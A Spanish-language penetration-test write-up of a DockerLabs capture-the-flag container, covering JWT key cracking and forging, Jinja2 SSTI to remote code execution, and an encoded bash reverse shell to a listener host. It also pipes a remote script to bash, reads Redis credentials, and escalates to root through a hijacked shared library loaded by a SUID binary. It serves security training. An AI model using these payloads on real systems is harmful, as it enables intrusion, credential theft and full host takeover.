# Reporte de Auditoría de Seguridad — NOCTIS

**Fecha:** 2026-11-11
**Objetivo:** `http://172.17.0.2/` (contenedor DockerLabs "noctis")
**Clasificación:** Nivel medio - Ejercicio autorizado de hacking ético
**Resultado global:** Compromiso total. Se obtuvo ejecución remota de comandos (RCE), movimiento lateral y **root** en el sistema.

---

## 1. Resumen ejecutivo

La aplicación NOCTIS presenta una cadena de vulnerabilidades encadenables que permiten a un atacante sin credenciales pasar de visitante anónimo a **control administrativo del host (root)**. La raíz del problema es la combinación de un **panel legacy** expuesto en un vhost no publicado, protegido por **JWT HS256 con una clave débil y hardcodeada**, un **motor de plantillas Jinja2 que renderiza entrada del usuario (SSTI)**, secretos almacenados en **Redis sin autenticación** y un binario **SUID que carga una librería desde un directorio escribible**.

El ejercicio permitió capturar las dos flags del laboratorio:

| Flag | Valor |
|---|---|
| Usuario (nova) | `NOCTIS{cr0ss1ng_7h3_gr1d_4_1nt3rn4l_5t4t10n_2fbd3}` |
| Root | `NOCTIS{d4rk_v01d_0wn3d_8c4f2e}` |

> Nota: durante la enumeración aparecieron varias *flags señuelo* (`d3c0y_1nt3rn4l_s34l_n0t_r0ot`, `c4ch3_r4bb1t_v4ult_n0t_r00t`, `5h4d0w_b0mb...`). No son las flags válidas del reto; se documentan como evidencia de higiene deficiente de secretos.

---

## 2. Alcance y metodología

- **Alcance:** host `172.17.0.2`, servicios TCP expuestos y servicios internos alcanzables tras el compromiso inicial.
- **Fases:** reconocimiento → enumeración web → análisis de artefactos → explotación → post-explotación → escalada → evidencia.
- **Herramientas:** nmap, curl, steghide, hashcat/john (verificación), Python, gcc.
- **Restricciones:** entorno de laboratorio autorizado; no se atacaron sistemas externos.

### Superficie expuesta
| Puerto | Servicio | Observación |
|---|---|---|
| 22/tcp | SSH (OpenSSH) | Autenticación por contraseña habilitada |
| 80/tcp | nginx → Flask | Landing + vhost `admin.noctis` |

## 3. Cadena de ataque (kill chain)

### Reconocimiento web

La landing pública filtra en un comentario HTML el bundle legacy, la clave `"midnight"` y la existencia de un vhost de administración no publicado.

```bash
sudo nmap -sS -sC -sV -p- 172.17.0.2
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 8b:73:1e:55:46:83:44:20:64:3d:71:0b:fa:86:f2:c3 (ECDSA)
|_  256 a5:99:11:31:96:1b:5f:3e:e6:b2:f3:40:cb:95:55:3e (ED25519)
80/tcp open  http    nginx
|_http-title: NOCTIS Systems \xE2\x80\x94 Orbital Intelligence
```

Puertos activos 22 (SSH) y 80 (nginx).

```bash
curl -s -i http://172.17.0.2/
```

```text
HTTP/1.1 200 OK
Server: nginx
Date: Sat, 11 Nov 2026 10:00:21 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2747
Connection: keep-alive

<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>NOCTIS Systems — Orbital Intelligence</title>
<link rel="stylesheet" href="/static/css/noctis.css"/>
<!--
  ============================================================
  bundle: noctis-relic-4.7.x
  nota integración: el arte heredado de esta landing queda sellado en
  /static/img/hero.jpg; el digest se verifica con la clave del turno
  nocturno  ("midnight"). el vhost del panel legacy no se publica en
  los DNS internos por decisión del SOC — se firma por aparte.
  ============================================================
-->
```

El HTML contiene pistas: un arte en `/static/img/hero.jpg` con "digest verificado con la clave midnight" y un **vhost legacy oculto**.

### Esteganografía

`hero.jpg` contenía un archivo oculto (steghide, passphrase `midnight`) con la pista `admin.noctis` y el stack `JWT HS256`.

Descargamos el archivo oculto:

```bash
curl -s -O http://172.17.0.2/static/img/hero.jpg && ls -la hero.jpg

```

```text
-rw-r--r-- 1 cameron htb_kali 113082 Nov 11 10:25 hero.jpg
```

Mostramos la información del archivo `hero.jpg`:

```bash
steghide info hero.jpg
```

```text
"hero.jpg":
  format: jpeg
  capacity: 5.2 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "hint.txt":
    size: 137.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
```

Extraemos y leemos el dato secreto (`hint.txt`) del archivo `hero.jpg`:

```bash
steghide extract -sf hero.jpg
```

```text
Enter passphrase: 
wrote extracted data to "hint.txt".
```

```bash
cat hint.txt
```

```text
side-channel legacy activo
vhost de ops: admin.noctis
stack auth del panel: JWT HS256 (LEGADO)
la clave de firma se rota... o se cracks.
```

- vhost `admin.noctis` con panel protegido por `JWT HS256`.
- JWT, o JSON Web Token, es un estándar abierto que se utiliza para compartir información entre dos partes de forma segura: un cliente y un servidor.

### Bypass de autenticación

`/admin/auth` emite token *guest* para **cualquier** usuario/contraseña; además la clave de firma HS256 es `midnight`.

Accedemos usando la cabezara Host:

```bash
curl -i --resolve admin.noctis:80:172.17.0.2 http://admin.noctis/
```

```text
HTTP/1.1 302 FOUND
Server: nginx
Date: Wed, 11 Nov 2026 10:08:51 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 211
Connection: keep-alive
Location: /admin/login

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/admin/login">/admin/login</a>. If not, click the link.
```

El 302 indica que / redirige a /admin/login. Ya obtuvimos la ruta del formulario. En esta respuesta no aparece `Set-Cookie` ni un `JWT`, así que el siguiente paso es inspeccionar la página de login y la respuesta al iniciar sesión:

```bash
curl -i -L --max-redirs 5 --resolve admin.noctis:80:172.17.0.2 http://admin.noctis/
```

```text
HTTP/1.1 302 FOUND
Server: nginx
Date: Wed, 11 Nov 2026 10:16:55 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 211
Connection: keep-alive
Location: /admin/login

HTTP/1.1 200 OK
Server: nginx
Date: Wed, 11 Nov 2026 10:16:55 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2263
Connection: keep-alive

<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>NOCTIS // Panel Ops — acceso</title>
<link rel="stylesheet" href="/static/css/noctis.css"/>
</head>
<body>
<canvas id="rain" aria-hidden="true"></canvas>
<div class="scanlines" aria-hidden="true"></div>

<main class="panel-wrap">
  <section class="glass login-card">
    <header class="brand small">
      <span class="tag">//</span><span class="word">NOCTIS</span><span class="sub">PANEL OPS · legacy tier</span>
    </header>

    <form id="f" autocomplete="off">
      <label>operador
        <input id="user" name="user" placeholder="op-000" required/>
      </label>
      <label>contraeña
        <input id="pass" name="pass" type="password" placeholder="••••••••" required/>
      </label>
      <button class="btn primary wide" type="submit">AUTENTICAR ▸</button>
    </form>

    <pre id="out" class="mono out" hidden></pre>

    <p class="disclaimer dim mono">
      // CAC-2 desconectado: el portal emite tokens LEGACY HS256 y los valida en frío.
      // elevación a admin requiere re-firma auditada.
    </p>
    <nav class="foot-links mono dim">
      <a href="/admin/panel">panel</a> · <a href="/admin/console">consola</a>
    </nav>
  </section>
</main>

<script>
const f = document.getElementById('f');
const out = document.getElementById('out');
f.addEventListener('submit', async (e) => {
  e.preventDefault();
  out.hidden = false;
  out.textContent = '[*] engaged queue...';
  try {
    const r = await fetch('/admin/auth', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({user: f.user.value, pass: f.pass.value}),
    });
    const j = await r.json();
    if (j.token) {
      document.cookie = 'noctauth=' + j.token + '; path=/; max-age=86400; samesite=Lax';
      out.textContent =
        '[+] verification queue engaged.\n[+] legacy scope token issued:\n\n' + j.token +
        '\n\n[*] tier: guest — el SOC debe re-firmar para tier admin.';
    } else {
      out.textContent = '[-] ' + (j.err || 'rejected');
    }
  } catch (err) {
    out.textContent = '[-] transport error';
  }
});
</script>
</body>
</html>
```

Ahora enviamos un POST `/admin/auth` y comprobamos si el servidor devuelve un token de invitado. El JavaScript espera un campo token en la respuesta JSON y, si lo recibe, guarda su valor en la cookie noctauth:

```bash
curl -i --resolve admin.noctis:80:172.17.0.2 http://admin.noctis/admin/auth -H 'Content-Type: application/json' --data '{"user":"admin","pass":"admin"}'
```

```text
HTTP/1.1 200 OK
Server: nginx
Date: Wed, 11 Nov 2026 10:28:07 GMT
Content-Type: application/json
Content-Length: 287
Connection: keep-alive
Set-Cookie: noctauth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiZ3Vlc3QiLCJ0aWVyIjoibGVnYWN5Iiwibm90ZSI6Im9wZXJhdG9yIGNsZWFyYW5jZSBwZW5kaW5nIGF1ZGl0IGFwcHJvdmFsIn0.nrK8iqym3wi1P5pXJKjHnWk1Lei-PFo4Vf_-Gn5jW6s; Expires=Thu, 12 Nov 2026 10:28:07 GMT; Max-Age=86400; Path=/; SameSite=Lax

{"message":"verification queue engaged. access scope: legacy.","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiZ3Vlc3QiLCJ0aWVyIjoibGVnYWN5Iiwibm90ZSI6Im9wZXJhdG9yIGNsZWFyYW5jZSBwZW5kaW5nIGF1ZGl0IGFwcHJvdmFsIn0.nrK8iqym3wi1P5pXJKjHnWk1Lei-PFo4Vf_-Gn5jW6s"}
```

El servidor envia un token de invitado de tipo `JWT HS256`:

```text
"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiZ3Vlc3QiLCJ0aWVyIjoibGVnYWN5Iiwibm90ZSI6Im9wZXJhdG9yIGNsZWFyYW5jZSBwZW5kaW5nIGF1ZGl0IGFwcHJvdmFsIn0.nrK8iqym3wi1P5pXJKjHnWk1Lei-PFo4Vf_-Gn5jW6s"
```

Usamos la web https://www.jwt.io/ para analizar como esta contruido el `JWT HS256`:

```bash
Decoded Header:
{
  "alg": "HS256",
  "typ": "JWT"
}

Decoded Payload:
{
  "user": "admin",
  "role": "guest",
  "tier": "legacy",
  "note": "operator clearance pending audit approval"
}

JWT Signature Verification:
a-string-secret-at-least-256-bits-long
```

El login acepta **cualquier credencial** y emite un token guest. Intentaremos crackear/firmar el `HS256` para elevar a `admin`, para ello usaremos la herramienta `John the Ripper` y el diccionario `rockyou.txt`:

```bash
john --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt
```

```text
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
midnight         (?)     
1g 0:00:00:00 DONE (2026-11-11 17:05) 25.00g/s 204800p/s 204800c/s 204800C/s 123456..whitetiger
```

### Crear JWT

Se firma un token con `role=admin` y se accede a `/admin/panel`, `/admin/chat` y `/admin/console`.

La clave de firma HS256 es `midnight`. Creo un token con rol admin y accedo al panel/consola. Para ello vamos a usar la misma web https://www.jwt.io/:

```bash
Decoded Header:
{
  "alg": "HS256",
  "typ": "JWT"
}

Decoded Payload:
{
  "user": "admin",
  "role": "admin",
  "tier": "legacy",
  "note": "operator clearance pending audit approval"
}

JWT Signature Verification:
midnight
```

```text
Token:"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJ0aWVyIjoibGVnYWN5Iiwibm90ZSI6Im9wZXJhdG9yIGNsZWFyYW5jZSBwZW5kaW5nIGF1ZGl0IGFwcHJvdmFsIn0.OTRrrT0DH0QpkG3DU6NTZ4vFpItsDsbkBHoZHvE8IQc"
```

http://admin.noctis/admin/panel:

```bash
curl -i --resolve admin.noctis:80:172.17.0.2 --cookie "noctauth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJ0aWVyIjoibGVnYWN5Iiwibm90ZSI6Im9wZXJhdG9yIGNsZWFyYW5jZSBwZW5kaW5nIGF1ZGl0IGFwcHJvdmFsIn0.OTRrrT0DH0QpkG3DU6NTZ4vFpItsDsbkBHoZHvE8IQc" http://admin.noctis/admin/panel
```

```text
HTTP/1.1 200 OK
Server: nginx
Date: Wed, 11 Nov 2026 16:07:43 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1804
Connection: keep-alive

<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>NOCTIS // Panel Ops — elevado</title>
<link rel="stylesheet" href="/static/css/noctis.css"/>
</head>
<body>
<canvas id="rain" aria-hidden="true"></canvas>
<div class="scanlines" aria-hidden="true"></div>

<main class="panel-wrap">
  <header class="panel-head">
    <div class="brand small"><span class="tag">//</span><span class="word">NOCTIS</span><span class="sub">PANEL OPS</span></div>
    <div class="who mono">clearance: <b class="ok">admin</b> · operator: admin</div>
  </header>

  <section class="grid2">
    <article class="glass card">
      <h3>◈ NOCTIS-7 <span class="dim mono small">legacy macros engine</span></h3>
      <p>Asistente del SOC. Renderiza tus turnos con el motor de plantillas del panel para soportar macros heredadas.</p>
      <a class="btn ghost" href="/admin/chat">ABRIR RELAY ▸</a>
    </article>
    <article class="glass card">
      <h3>◈ Consola de integridad</h3>
      <p>Scoring de anomalías y estado del sello remoto.</p>
      <a class="btn ghost" href="/admin/console">ABRIR ▸</a>
    </article>
  </section>

  <section class="glass wide mono feed">
    <h2 class="mono">FLEET FEED</h2>
    <ul>
      <li><span class="dim">VNT-014</span> Telemetría nominal <span class="ok">OK</span></li>
      <li><span class="dim">VNT-771</span> Re-firma firmware pendiente <span class="warn">AGAIN</span></li>
      <li><span class="dim">HALO-9</span> Latencia malla elevada <span class="warn">SOFT</span></li>
      <li><span class="dim">LEGACY-0x2A</span> Cert .legacy expira en 19 días <span class="err">CRIT</span></li>
    </ul>
  </section>
</main>

<script src="/static/js/noctis.js"></script>
</body>
</html>
```

http://admin.noctis/admin/console

```bash
curl -i --resolve admin.noctis:80:172.17.0.2 --cookie "noctauth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJ0aWVyIjoibGVnYWN5Iiwibm90ZSI6Im9wZXJhdG9yIGNsZWFyYW5jZSBwZW5kaW5nIGF1ZGl0IGFwcHJvdmFsIn0.OTRrrT0DH0QpkG3DU6NTZ4vFpItsDsbkBHoZHvE8IQc" http://admin.noctis/admin/console
```

```text
HTTP/1.1 200 OK
Server: nginx
Date: Wed, 11 Nov 2026 16:12:28 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1580
Connection: keep-alive

<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>NOCTIS // Consola de integridad</title>
<link rel="stylesheet" href="/static/css/noctis.css"/>
</head>
<body>
<canvas id="rain" aria-hidden="true"></canvas>
<div class="scanlines" aria-hidden="true"></div>

<main class="panel-wrap">
  <header class="panel-head">
    <div class="brand small"><span class="tag">//</span><span class="word">NOCTIS</span><span class="sub">CONSOLA DE INTEGRIDAD</span></div>
    <div class="who mono">operator: admin</div>
  </header>

  <section class="glass wide mono feed">
    <h2 class="mono">REMOTE SEAL · estado</h2>
    <ul>
      <li>sell en frío: <span class="warn">RETRASADO</span></li>
      <li>cadena de firma: HS256 legacy <span class="err">DEPRACTED</span></li>
      <li>última auditoría: 2019-11-03 <span class="dim">(planeada para 2020 — nunca sucedió)</span></li>
    </ul>
  </section>

  <section class="glass wide console">
    <h2>Sello de integridad del bundle</h2>
    <p class="mono dim">localhost seal — entorno de demostración (no producción):</p>
    <pre class="mono">NOCTIS{d3c0y_1nt3rn4l_s34l_n0t_r0ot}</pre>
    <p class="dim small">si estás leyendo esto y las marcas de sello son internas, quizá esto es lo bastante bueno para <em>tu</em> informe, pero el jugador real sabe que prod vive en otro lado.</p>
    <a class="btn ghost mono" href="/admin/panel">◂ volver al panel</a>
  </section>
</main>

<script src="/static/js/noctis.js"></script>
</body>
</html>
```

En `/admin/panel` existe un `relay` con motor de plantillas (`/admin/chat`) y una consola:

```bash
curl -i --resolve admin.noctis:80:172.17.0.2 --cookie "noctauth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJ0aWVyIjoibGVnYWN5Iiwibm90ZSI6Im9wZXJhdG9yIGNsZWFyYW5jZSBwZW5kaW5nIGF1ZGl0IGFwcHJvdmFsIn0.OTRrrT0DH0QpkG3DU6NTZ4vFpItsDsbkBHoZHvE8IQc" http://admin.noctis/admin/chat
```

```text
HTTP/1.1 200 OK
Server: nginx
Date: Wed, 11 Nov 2026 17:20:00 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2001
Connection: keep-alive

<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>NOCTIS // NOCTIS-7</title>
<link rel="stylesheet" href="/static/css/noctis.css"/>
</head>
<body>
<canvas id="rain" aria-hidden="true"></canvas>
<div class="scanlines" aria-hidden="true"></div>

<main class="panel-wrap">
  <header class="panel-head">
    <div class="brand small"><span class="tag">//</span><span class="word">NOCTIS</span><span class="sub">NOCTIS-7 RELAY</span></div>
    <div class="who mono">operator: admin</div>
  </header>

  <section class="glass wide chat">
    <div id="log" class="chatlog mono">
      <div class="line bot">◈ NOCTIS-7 en línea. Macros heredadas activas:</div>
      <div class="line bot dim">Sintaxis libre ({ expr } soportado). El motor es el mismo del panel.</div>
    </div>
    <form id="f" class="chatbar mono">
      <span class="prompt">op@noctis-7 $</span>
      <input id="msg" placeholder="transmitir turno..." autocomplete="off" autofocus/>
      <button class="btn primary">SEND</button>
    </form>
  </section>
</main>

<script>
const log = document.getElementById('log'), f = document.getElementById('f');
function put(cls, txt){
  const d = document.createElement('div');
  d.className = 'line ' + cls;
  d.textContent = txt;
  log.appendChild(d);
  log.scrollTop = log.scrollHeight;
}
f.addEventListener('submit', async (e) => {
  e.preventDefault();
  const m = document.getElementById('msg').value;
  if(!m.trim()) return;
  put('me', m);
  document.getElementById('msg').value = '';
  try{
    const r = await fetch('/admin/chat', {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({msg: m}),
    });
    const j = await r.json();
    put(j.reply !== undefined ? 'bot' : 'err', j.reply !== undefined ? j.reply : (j.message || j.description || j.err));
  }catch(err){
    put('err', '[-] relay transport error');
  }
});
</script>
</body>
</html>
```

### RCE (SSTI)

`/admin/chat` renderiza la entrada con Jinja2 (`{{7*7}}` → `49`); se escapa del sandbox y se ejecuta `id` como `www-data`. Además se logra objetener una ejecución de comandos.

El relay es un motor de plantillas con sintaxis `{ expr }` — probable **SSTI (Jinja2)**:

```bash
curl -i --resolve admin.noctis:80:172.17.0.2 --cookie "noctauth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJ0aWVyIjoibGVnYWN5Iiwibm90ZSI6Im9wZXJhdG9yIGNsZWFyYW5jZSBwZW5kaW5nIGF1ZGl0IGFwcHJvdmFsIn0.OTRrrT0DH0QpkG3DU6NTZ4vFpItsDsbkBHoZHvE8IQc" -H 'Content-Type: application/json' http://admin.noctis/admin/chat --data-raw '{"msg":"{{7*7}}"}'
```

```text
HTTP/1.1 200 OK
Server: nginx
Date: Wed, 11 Nov 2026 17:27:02 GMT
Content-Type: application/json
Content-Length: 15
Connection: keep-alive

{"reply":"49"}
```

**SSTI Jinja2** confirmado (`{{7*7}}` → 49).

El **SSTI** ocurre cuando la entrada del usuario se concatena directamente en una plantilla en lugar de pasarse como un dato separado. Esto permite al atacante inyectar directivas del motor de plantillas como **Jinja2** para ejecutar código en el servidor.

Ahora ejecutamos comandos en el sandbox:

```bash
curl -i --resolve admin.noctis:80:172.17.0.2 --cookie "noctauth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJ0aWVyIjoibGVnYWN5Iiwibm90ZSI6Im9wZXJhdG9yIGNsZWFyYW5jZSBwZW5kaW5nIGF1ZGl0IGFwcHJvdmFsIn0.OTRrrT0DH0QpkG3DU6NTZ4vFpItsDsbkBHoZHvE8IQc" -H 'Content-Type: application/json' http://admin.noctis/admin/chat --data-raw '{"msg":"{{ cycler.__init__.__globals__.os.popen(\"id\").read()  }}"}'
```

```text
HTTP/1.1 200 OK
Server: nginx
Date: Wed, 11 Nov 2026 17:30:20 GMT
Content-Type: application/json
Content-Length: 68
Connection: keep-alive

{"reply":"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"}
```

RCE como **www-data**. Realizamos un **reverse Shell**, pero con el payload codificado en base64:

```bash
Payload: bash -c '/bin/bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'

echo "bash -c '/bin/bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'" | base64 -w0

echo YmFzaCAtYyAnL2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xNy4wLjEvNDQ0NCAwPiYxJwo= | base64 -d | bash 2>/dev/null

curl -i --resolve admin.noctis:80:172.17.0.2 --cookie "noctauth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJ0aWVyIjoibGVnYWN5Iiwibm90ZSI6Im9wZXJhdG9yIGNsZWFyYW5jZSBwZW5kaW5nIGF1ZGl0IGFwcHJvdmFsIn0.OTRrrT0DH0QpkG3DU6NTZ4vFpItsDsbkBHoZHvE8IQc" -H 'Content-Type: application/json' http://admin.noctis/admin/chat --data-raw '{"msg":"{{ cycler.__init__.__globals__.os.popen(\"echo YmFzaCAtYyAnL2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xNy4wLjEvNDQ0NCAwPiYxJwo= | base64 -d | bash 2>/dev/null\").read() }}"}'
```

En otra terminal, vamos a recibir la `reverse Shell` y lo dejamos escuchando hacia el puerto 4444:

```bash
rlwrap nc -nvlp 4444
```

```text
listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 34316
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@noctis:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@noctis:/$ whoami
whoami
www-data
www-data@noctis:/$ hostname
hostname
noctis
www-data@noctis:/$
```

RCE obtenida.

### Movimiento lateral

Redis interno (`127.0.0.1:6379`) sin autenticación expone `vault:creds:nova:main` = `n0v4-xr-7734`; acceso SSH como `nova`.

Enumeramos el sistema para escalar privilegios. Para ello usaremos la herramienta `linpeas`:

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash
```

Encontramos que el servicio `redis` esta activo en el puerto `6379`:

```text
                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                    
                ╚════════════════════════════════════════════════╝                                                    
╔══════════╣ Running processes (cleaned) (T1057)
╚ Check weird & unexpected processes run by root: https://book.hacktricks.wiki/en/linux-hardening/processes-crontab-systemd-dbus/process-enumeration-and-service-paths.html#map-processes-and-ownership                                     
root           1  0.0  0.0   2740   300 ?        Ss   18:22   0:01 tail -f /dev/null                                  
root           9  0.0  0.0  11172   128 ?        Ss   18:22   0:00 nginx: master process nginx
www-data      11  0.0  0.0  11572   232 ?        S    18:22   0:00  _ nginx: worker process
www-data      12  0.0  0.0  11572  1060 ?        S    18:22   0:00  _ nginx: worker process
www-data      13  0.0  0.0  11572  1088 ?        S    18:22   0:00  _ nginx: worker process
www-data      14  0.0  0.0  11572  1536 ?        S    18:22   0:00  _ nginx: worker process
redis         17  0.2  0.0  62372   876 ?        Ssl  18:22   0:25 redis-server 127.0.0.1:6379
```

Analizamos el servicio `redis`:

```bash
www-data@noctis:/$ which redis-cli
```

```text
/usr/bin/redis-cli
```

```bash
www-data@noctis:/$ redis-cli keys "*"
```

```text
fleet:vnt-771
vault:creds:nova:main
audit:0xF1:journal
backup:shadow:2024
fleet:vnt-014
flag:prod:root:pending
vault:gate:pin:cur
vault:note:ops
```

Redis interno expone claves de credenciales (vault:creds:nova:main, backup:shadow:2024). Extraemos sus valores:

```bash
www-data@noctis:/$ for k in $(redis-cli keys "*"); do echo "== $k ($(redis-cli type $k))"; redis-cli get $k; redis-cli lrange $k 0 -1 2>/dev/null; redis-cli hgetall $k 2>/dev/null; done
```

```text
== fleet:vnt-771 (string)
re-sign pending (cheap cert)
WRONGTYPE Operation against a key holding the wrong kind of value

WRONGTYPE Operation against a key holding the wrong kind of value

== vault:creds:nova:main (string)
n0v4-xr-7734
WRONGTYPE Operation against a key holding the wrong kind of value

WRONGTYPE Operation against a key holding the wrong kind of value

== audit:0xF1:journal (string)
rotated pin; old pin 7711-noct-void revoked (void)
WRONGTYPE Operation against a key holding the wrong kind of value

WRONGTYPE Operation against a key holding the wrong kind of value

== backup:shadow:2024 (string)
NOCTIS{5h4d0w_b0mb_15_n0t_4_fl4g_d0nt_h4xcr}
WRONGTYPE Operation against a key holding the wrong kind of value

WRONGTYPE Operation against a key holding the wrong kind of value

== fleet:vnt-014 (string)
telemetry nominal
WRONGTYPE Operation against a key holding the wrong kind of value

WRONGTYPE Operation against a key holding the wrong kind of value

== flag:prod:root:pending (string)
NOCTIS{c4ch3_r4bb1t_v4ult_n0t_r00t_9a3e}
WRONGTYPE Operation against a key holding the wrong kind of value

WRONGTYPE Operation against a key holding the wrong kind of value

== vault:gate:pin:cur (string)
noct-7714-void
WRONGTYPE Operation against a key holding the wrong kind of value

WRONGTYPE Operation against a key holding the wrong kind of value

== vault:note:ops (string)
pin/creds rotados en ciclo 0xF1 — LEGACY ya no se usa para llaves
WRONGTYPE Operation against a key holding the wrong kind of value

WRONGTYPE Operation against a key holding the wrong kind of value

```

Obtengo credenciales de **nova** (`n0v4-xr-7734`). Intentamos pivotar por SSH:

```bash
ssh nova@172.17.0.2
```

```text
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

 ╭─────────────────────────────────────────────────────╮
 │   NOCTIS SYSTEMS · estación orbital · acceso NOC    │
 │   "La noche no esconde nada; solo espera."          │
 ╰─────────────────────────────────────────────────────╯
nova@noctis:~$ id
uid=1001(nova) gid=1001(nova) groups=1001(nova)
nova@noctis:~$ 
nova@noctis:~$ whoami
nova
nova@noctis:~$ hostname
noctis
nova@noctis:~$
```

Ya somos **nova**. Ahora busquemos las flags/notas:

```bash
nova@noctis:~$ cat user.txt
```

```text
NOCTIS{cr0ss1ng_7h3_gr1d_4_1nt3rn4l_5t4t10n_2fbd3}
```

```bash
nova@noctis:~$ cat NOTES.md
```

```text
# bitácora nova (operadora NOC)

- el shim de audit (libnoctsec) se parchea SIN recompilar voidaudit. buena
  feature heredada del build 2.4 — pero igual cada audit del prod se queja.
- la consola del panel legacy esta "sellada" pero nadie del SOC la toca desde 2019.
- flag de user pendiente de custodia de SOC. la mías es la que corre el shell
  NOC: /home/nova/user.txt (custodia por regla interna).
```

Obtengo la flag de **nova** y el vector final para acceder como **root**.

### Escalada a root

`voidaudit` es SUID root y carga `libnoctsec.so` por `RUNPATH=/opt/noctis/lib`, directorio propiedad de `nova`. Se reemplaza la librería por una con constructor malicioso → `euid=0`.

Con `linpeas` tambien encontramos un binario SUID personalizado `/usr/bin/voidaudit`:

```text
-rwsr-xr-x 1 root root 17K Oct 11 18:28 /usr/bin/voidaudit (Unknown SUID binary!)
```

`voidaudit` es SUID root y carga `libnoctsec.so` desde `/opt/noctis/lib`:


```bash
www-data@noctis:/$ strings -n 5 /usr/bin/voidaudit | head -60
```

```text
...
libnoctsec.so
libc.so.6
GLIBC_2.3.4
GLIBC_2.4
GLIBC_2.2.5
GLIBC_2.34
/opt/noctis/lib
1.4.2
/var/log/voidjournal.log
...
```

```bash
nova@noctis:~$ ls -la /opt/noctis/lib
```

```text
total 24
drwxr-xr-x 2 nova nova  4096 Oct 11 18:31 .
drwxr-xr-x 4 nova nova  4096 Oct 11 18:31 ..
-rw-r--r-- 1 nova nova 15648 Oct 11 18:31 libnoctsec.so
```

`/opt/noctis/lib` pertenece a **nova**.

Revisando archivos `*.txt` dentro del servidor encontramos una pista:

```bash
nova@noctis:~$ cat /opt/noctis/README.txt
```

```text
NOCTIS shim dir
---------------
libnoctsec.so sí se p parchea aquí en caliente (feature del build 2.4).
voidaudit sigue cargándolo por RPATH -> /opt/noctis/lib
```

**Secuestramos `libnoctsec.so`** (escribible por nova) para que carge `voidaudit` como SUID root.

```bash
cp /opt/noctis/lib/libnoctsec.so /tmp/libnoctsec.so.bak

cat > /tmp/pwn.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) static void pwn(void){
    setgid(0);
    setuid(0);
    system("cat /root/root.txt > /tmp/root_flag 2>/dev/null; cp /bin/bash /tmp/rootbash; chown root:root /tmp/rootbash; chmod 4755 /tmp/rootbash");
}
void noctsec_boot(void){}
EOF

nova@noctis:/$ gcc -shared -fPIC -o /opt/noctis/lib/libnoctsec.so /tmp/pwn.c

nova@noctis:/$ echo "[*] lib reemplazada"; ls -la /opt/noctis/lib
echo "[*] ejecutando voidaudit (SUID root)"
voidaudit
echo "[*] resultado:"
id
